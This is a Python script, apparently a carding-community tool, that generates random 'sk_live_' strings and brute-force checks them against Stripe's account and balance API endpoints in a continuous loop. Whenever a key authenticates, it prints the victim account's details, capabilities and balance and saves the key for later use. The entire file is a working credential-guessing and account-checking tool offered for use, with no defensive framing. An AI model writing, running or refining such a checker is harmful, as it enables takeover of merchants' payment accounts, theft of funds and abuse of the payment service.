import random
import string
import json
import os
import time
import requests

def generate_sk_key_body(length=99):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def generate_keys(count):
    keys = []
    for _ in range(count):
        key = "sk_live_" + generate_sk_key_body()
        keys.append(key)
    return keys

def save_keys_to_txt(keys, filename="sk.txt"):
    with open(filename, "w") as f:
        for key in keys:
            f.write(key + "\n")

def append_keys_to_txt(keys, filename="sk.txt"):
    with open(filename, "a") as f:
        for key in keys:
            f.write(key + "\n")

def load_keys_from_txt(filename="sk.txt"):
    if not os.path.exists(filename):
        print("sk.txt file not found!")
        return []
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def check_sk_key(key):
    start = time.time()
    headers = {
        "Authorization": f"Bearer {key}"
    }
    try:
        response = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=10)
        if response.status_code == 200:
            acc = response.json()
            balance = requests.get("https://api.stripe.com/v1/balance", headers=headers)
            bal = balance.json() if balance.status_code == 200 else {}

            end = time.time()
            print(f"\n━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"  ✅ 𝐒𝐭𝐚𝐭𝐮𝐬 ↯ LIVE")
            print(f"  𝐌𝐨𝐝𝐞 ↯ {acc.get('settings', {}).get('dashboard', {}).get('display_name', 'N/A')}")
            print(f"  𝐈𝐧𝐭𝐞𝐠𝐫𝐚𝐭𝐢𝐨𝐧 ↯ {acc.get('settings', {}).get('payments', {}).get('statement_descriptor', 'N/A')}")
            print(f"  𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐓𝐲𝐩𝐞 ↯ {acc.get('type', 'N/A')}")
            print(f"  𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ {acc.get('country', 'N/A')}")
            print(f"  𝐂𝐮𝐫𝐫𝐞𝐧𝐜𝐲 ↯ {acc.get('default_currency', 'N/A')}")
            print(f"  𝐂𝐚𝐩𝐚𝐛𝐢𝐥𝐢𝐭𝐢𝐞𝐬 ↯ {', '.join(acc.get('capabilities', {}).keys())}")
            print(f"  𝐂𝐚𝐫𝐝 𝐏𝐚𝐲𝐦𝐞𝐧𝐭𝐬 ↯ {acc.get('capabilities', {}).get('card_payments', 'N/A')}")
            print(f"  𝐓𝐫𝐚𝐧𝐬𝐟𝐞𝐫𝐬 ↯ {acc.get('capabilities', {}).get('transfers', 'N/A')}")
            print(f"  𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐄𝐧𝐚𝐛𝐥𝐞𝐝 ↯ {acc.get('charges_enabled', 'N/A')}")
            print(f"  𝐏𝐚𝐲𝐨𝐮𝐭𝐬 𝐄𝐧𝐚𝐛𝐥𝐞𝐝 ↯ {acc.get('payouts_enabled', 'N/A')}")
            print(f"  𝐁𝐚𝐥𝐚𝐧𝐜𝐞 ↯ 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ↯ {bal.get('available', [{}])[0].get('amount', 'N/A')} {bal.get('available', [{}])[0].get('currency', 'N/A')}")
            print(f"  𝐏𝐞𝐧𝐝𝐢𝐧𝐠 ↯ {bal.get('pending', [{}])[0].get('amount', 'N/A')} {bal.get('pending', [{}])[0].get('currency', 'N/A')}")
            print(f"  𝐓𝐢𝐦𝐞 ↯ {round(end - start, 2)} sec")
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━\n")
            return True
        else:
            print(f"❌ 𝐒𝐭𝐚𝐭𝐮𝐬 ↯ DEAD for {key}")
            return False
    except Exception as e:
        print(f"❌ Error checking {key}: {e}")
        return False

def save_live_keys_json(live_keys, filename="sklive.json"):
    data = [{"sk_key": k, "status": "Live"} for k in live_keys]
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

def run_until_live_key_found(batch_size=10):
    live_keys = []
    attempt = 0
    total_keys_checked = 0
    
    try:
        print("\nRunning continuous mode until a live key is found...")
        print("Press Ctrl+C to stop at any time\n")
        
        while not live_keys:
            attempt += 1
            print(f"\n━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"      Batch #{attempt}")
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━\n")
            
            # Generate a new batch of keys
            generated_keys = generate_keys(batch_size)
            
            # Save keys to file (append to keep track of all generated keys)
            append_keys_to_txt(generated_keys)
            
            # Check each key in this batch
            for k in generated_keys:
                total_keys_checked += 1
                print(f"[{total_keys_checked}] Checking: {k}")
                if check_sk_key(k):
                    live_keys.append(k)
                    # Save immediately when we find a live key
                    save_live_keys_json(live_keys)
                    print(f"\n🎉 Success! Found a LIVE key after checking {total_keys_checked} keys")
                    print(f"Live key: {k}")
                    print(f"Live keys saved to sklive.json")
                    return live_keys
            
            # Status update after each batch
            print(f"\nNo live keys found after checking {total_keys_checked} keys")
            print(f"Continuing with next batch...")
            
            # Sleep between batches to avoid rate limiting and reduce server load
            time.sleep(5)
            
    except KeyboardInterrupt:
        print("\n\nProcess interrupted by user.")
        if live_keys:
            save_live_keys_json(live_keys)
            print(f"Found {len(live_keys)} LIVE keys before interruption")
            print(f"Live keys saved to sklive.json")
        else:
            print(f"No live keys found after checking {total_keys_checked} keys")
    
    return live_keys

# Main script with improved error handling for Linux environments
if __name__ == "__main__":
    print("━━━━━━━━━━━━━━━━━━━━━━━━")
    print("   Continuous SK Finder")
    print("  Based on SK Key Tool by @Darkboy22")
    print("━━━━━━━━━━━━━━━━━━━━━━━━\n")

    try:
        batch_size = 10  # Default batch size
        
        # Try to get batch size from user
        try:
            user_input = input("How many SK keys to generate per batch? [default: 10] ")
            if user_input.strip():
                batch_size = int(user_input)
        except ValueError:
            print("Invalid number! Using default batch size of 10")
        
        # Run the continuous checker
        run_until_live_key_found(batch_size)
    
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        print("The script will now exit. Check your network connection and try again.") 